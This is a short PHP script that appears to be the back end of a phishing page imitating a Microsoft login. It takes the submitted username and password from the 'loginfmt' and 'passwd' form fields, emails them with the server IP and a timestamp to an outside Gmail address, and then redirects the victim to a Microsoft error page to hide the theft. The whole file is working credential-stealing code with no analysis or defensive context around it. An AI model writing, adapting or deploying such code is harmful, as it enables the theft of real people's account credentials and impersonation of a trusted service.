<?php
  $localIP = getHostByName(getHostName());
  $to = "login.live.replit@gmail.com";
  $subject = $localIP . " - " . strval(date("m.d.y")) . " - " . strval(date("h.i.sa")) . ".txt";
  $txt = "IP: " . $localIP . ", Username: " . $_POST['loginfmt'] . ", Password: " . $_POST['passwd'] . "\n";
  mail($to, $subject, $txt);
  header("Location: https://www.microsoft.com/en-us/error/404");
  exit();
?>